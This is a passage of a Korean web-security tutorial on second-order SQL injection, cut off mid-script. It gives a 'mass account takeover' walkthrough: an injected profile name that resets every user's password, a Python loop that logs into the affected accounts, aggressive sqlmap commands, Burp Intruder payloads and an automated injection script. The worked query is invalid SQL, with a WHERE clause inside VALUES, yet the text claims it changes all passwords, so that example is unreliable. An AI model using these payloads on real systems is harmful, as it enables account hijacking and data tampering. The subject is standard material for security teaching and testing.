<h3 class="anchor anchorWithStickyNavbar_LWe7" id="시나리오-3-대량-계정-탈취">시나리오 3: 대량 계정 탈취<a href="#시나리오-3-대량-계정-탈취" class="hash-link" aria-label="Direct link to 시나리오 3: 대량 계정 탈취" title="Direct link to 시나리오 3: 대량 계정 탈취" translate="no">​</a></h3>
<p><strong>대상</strong>: 소셜 네트워크</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="phase-1-페이로드-삽입">Phase 1: 페이로드 삽입<a href="#phase-1-페이로드-삽입" class="hash-link" aria-label="Direct link to Phase 1: 페이로드 삽입" title="Direct link to Phase 1: 페이로드 삽입" translate="no">​</a></h4>
<p><strong>1. 프로필 이름 변경</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Name: Alice&#x27; WHERE user_id != 1; UPDATE users SET password=&#x27;5f4dcc3b5aa765d61d8327deb882cf99</span><br></span></code></pre></div></div>
<hr>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="phase-2-이메일-발송-트리거">Phase 2: 이메일 발송 트리거<a href="#phase-2-이메일-발송-트리거" class="hash-link" aria-label="Direct link to Phase 2: 이메일 발송 트리거" title="Direct link to Phase 2: 이메일 발송 트리거" translate="no">​</a></h4>
<p><strong>2. 친구 요청 발송</strong>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// send_notification.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$sender_name = get_user_name($_SESSION[&#x27;user_id&#x27;]);  // Alice&#x27; WHERE user_id != 1; UPDATE...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$receiver_id = $_POST[&#x27;receiver_id&#x27;];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 취약한 알림 생성 쿼리</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$query = &quot;INSERT INTO notifications (user_id, message) VALUES ($receiver_id, &#x27;Friend request from $sender_name&#x27;)&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysqli_query($conn, $query);</span><br></span></code></pre></div></div>
<p><strong>생성되는 쿼리</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">INSERT</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">INTO</span><span class="token plain"> notifications </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">user_id</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> message</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">VALUES</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">10</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;Friend request from Alice&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> user_id </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">UPDATE</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">SET</span><span class="token plain"> password</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;5f4dcc3b5aa765d61d8327deb882cf99&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p><strong>결과</strong> (Stacked Queries 지원 시):</p>
<ul>
<li>ID 1을 제외한 <strong>모든 사용자의 비밀번호가 <code>password</code>로 변경</strong></li>
</ul>
<hr>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="phase-3-대량-로그인">Phase 3: 대량 로그인<a href="#phase-3-대량-로그인" class="hash-link" aria-label="Direct link to Phase 3: 대량 로그인" title="Direct link to Phase 3: 대량 로그인" translate="no">​</a></h4>
<p><strong>3. 계정 탈취</strong>:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">target </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://social-network.com/login&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">password </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;password&quot;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># 변경된 비밀번호</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 사용자 목록 (크롤링 또는 추측)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">users </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;alice&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;bob&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;charlie&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;david&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> user </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> users</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">target</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&quot;username&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> user</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;password&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> password</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Welcome&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;[+] Successfully logged in as </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">user</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="자동화-도구-automated-tools">자동화 도구 (Automated Tools)<a href="#자동화-도구-automated-tools" class="hash-link" aria-label="Direct link to 자동화 도구 (Automated Tools)" title="Direct link to 자동화 도구 (Automated Tools)" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="sqlmap---second-order-sqli">SQLMap - Second-Order SQLi<a href="#sqlmap---second-order-sqli" class="hash-link" aria-label="Direct link to SQLMap - Second-Order SQLi" title="Direct link to SQLMap - Second-Order SQLi" translate="no">​</a></h3>
<p>SQLMap은 <strong>Second-Order를 제한적으로 지원</strong>:</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="기본-사용법">기본 사용법<a href="#기본-사용법" class="hash-link" aria-label="Direct link to 기본 사용법" title="Direct link to 기본 사용법" translate="no">​</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 1단계: 페이로드 저장 위치 지정</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://example.com/register&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --data=&quot;username=*&amp;password=test&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --second-order=&quot;http://example.com/profile&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 2단계: 자동 탐지</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://example.com/profile&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --cookie=&quot;session=abc123&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --second-url=&quot;http://example.com/profile/edit&quot;</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="상세-옵션">상세 옵션<a href="#상세-옵션" class="hash-link" aria-label="Direct link to 상세 옵션" title="Direct link to 상세 옵션" translate="no">​</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 1. 회원가입 페이지에 페이로드 주입</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://example.com/register&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --data=&quot;username=*&amp;email=test@test.com&amp;password=pass&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --second-order=&quot;http://example.com/orders&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --cookie=&quot;session=abc123&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --level=5 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --risk=3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 2. 프로필 페이지에서 결과 확인</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://example.com/profile&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --cookie=&quot;session=abc123&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --technique=BEUSTQ \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --second-url=&quot;http://example.com/settings&quot;</span><br></span></code></pre></div></div>
<p><strong>제약</strong>:</p>
<ul>
<li>복잡한 다단계 시나리오는 수동 분석 필요</li>
<li>자동 탐지율 낮음</li>
</ul>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="burp-suite---second-order-탐지">Burp Suite - Second-Order 탐지<a href="#burp-suite---second-order-탐지" class="hash-link" aria-label="Direct link to Burp Suite - Second-Order 탐지" title="Direct link to Burp Suite - Second-Order 탐지" translate="no">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="burp-scanner-professional">Burp Scanner (Professional)<a href="#burp-scanner-professional" class="hash-link" aria-label="Direct link to Burp Scanner (Professional)" title="Direct link to Burp Scanner (Professional)" translate="no">​</a></h4>
<p><strong>1. Passive Scan 설정</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Burp → Scanner → Scan Configuration</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">→ &quot;Stored SQL Injection&quot; 활성화</span><br></span></code></pre></div></div>
<p><strong>2. Site Map에서 우클릭</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Scan → Passive Scan</span><br></span></code></pre></div></div>
<p><strong>3. Issue 확인</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Target → Site Map → Issues</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">→ &quot;Stored SQL Injection&quot; 항목 확인</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="manual-testing-with-burp">Manual Testing with Burp<a href="#manual-testing-with-burp" class="hash-link" aria-label="Direct link to Manual Testing with Burp" title="Direct link to Manual Testing with Burp" translate="no">​</a></h4>
<p><strong>1. Intruder로 페이로드 삽입</strong>:</p>
<div class="language-http codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-http codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">POST /register HTTP/1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host: example.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">username=§payload§&amp;password=test123</span><br></span></code></pre></div></div>
<p><strong>Payloads</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">test&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test&#x27; OR &#x27;1&#x27;=&#x27;1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test&#x27;; WAITFOR DELAY &#x27;00:00:05&#x27;--</span><br></span></code></pre></div></div>
<p><strong>2. 다른 페이지에서 응답 확인</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">GET /profile HTTP/1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GET /settings HTTP/1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GET /orders HTTP/1.1</span><br></span></code></pre></div></div>
<p><strong>3. Response 비교</strong> (Comparer):</p>
<ul>
<li>에러 메시지</li>
<li>응답 시간</li>
<li>페이지 내용 변화</li>
</ul>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="custom-python-script">Custom Python Script<a href="#custom-python-script" class="hash-link" aria-label="Direct link to Custom Python Script" title="Direct link to Custom Python Script" translate="no">​</a></h3>
<p><strong>Second-Order SQLi 자동 테스트 스크립트</strong>:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 설정</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">register_url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://example.com/register&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">trigger_url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://example.com/profile&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payloads </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;test&#x27;&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;test\&quot;&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;test&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;test&#x27;; WAITFOR DELAY &#x27;00:00:05&#x27;--&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;test&#x27; UNION SELECT NULL--&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">register_user</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">&quot;&quot;&quot;1단계: 페이로드를 포함한 사용자 등록&quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;username&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;password&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Password123!&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;email&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&quot;test</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">int</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">time</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">.</span><span class="token string-interpolation interpolation">time</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">@test.com&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">register_url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">status_code </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">200</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># 세션 쿠키 추출</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">cookies</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;session&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">None</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">trigger_second_order</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">session_cookie</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">&quot;&quot;&quot;2단계: 저장된 페이로드 실행 트리거&quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cookies </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&quot;session&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> session_cookie</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    start_time </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">time</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">trigger_url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> cookies</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">cookies</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    elapsed </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">time</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> start_time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> elapsed</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;[*] Starting Second-Order SQLi test...&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> payload </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> payloads</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;\n[*] Testing payload: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">payload</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># 1단계: 등록</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        session </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> register_user</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> session</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span 